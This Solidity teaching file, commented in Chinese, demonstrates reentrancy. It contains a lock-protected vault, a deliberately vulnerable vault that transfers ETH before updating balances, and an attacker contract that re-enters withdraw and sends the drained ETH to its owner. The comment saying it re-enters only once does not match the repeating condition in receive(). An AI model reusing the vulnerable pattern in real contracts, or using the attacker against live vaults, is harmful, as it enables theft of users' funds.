// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentrancyVault
 * @dev 演示防重入锁的合约
 */
contract ReentrancyVault {
    mapping(address => uint256) public balances;
    bool public locked;  // 防重入锁

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function deposit() external payable {
        require(msg.value > 0, "Deposit amount must be greater than 0");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external nonReentrant {
        require(amount > 0, "Withdraw amount must be greater than 0");
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        // 使用call（带防重入锁，所以安全）
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Withdraw(msg.sender, amount);
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    // 接收ETH
    receive() external payable {
        // 允许接收ETH
    }
}


/**
 * @title VulnerableVault
 * @dev 没有防重入锁的合约（演示漏洞）
 */
contract VulnerableVault {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Deposit amount must be greater than 0");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    // 注意：这里没有使用防重入锁！而且状态更新在转账之后（危险的CEI模式）
    function withdraw(uint256 amount) external {
        require(amount > 0, "Withdraw amount must be greater than 0");
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // 危险！先转账再更新余额 - 这会导致重入攻击
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= amount;  // 这行在转账之后！
        
        emit Withdraw(msg.sender, amount);
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    // 接收ETH
    receive() external payable {
        // 允许接收ETH
    }
}


/**
 * @title ReentrancyAttacker
 * @dev 简单的重入攻击合约
 */
contract ReentrancyAttacker {
    VulnerableVault public vault;
    address public owner;
    uint256 public attackAmount;

    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
        owner = msg.sender;
    }

    // 存款函数
    function deposit() external payable {
        require(msg.value > 0, "Must send ETH");
        vault.deposit{value: msg.value}();
    }

    // 攻击函数 - 单次重入
    function attack(uint256 _amount) external {
        require(msg.sender == owner, "Only owner");
        attackAmount = _amount;
        vault.withdraw(_amount);
    }

    // 接收ETH并单次重入
    receive() external payable {
        // 只重入一次
        if (attackAmount > 0 && address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }

    // 从合约转出ETH
    function getMoney() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
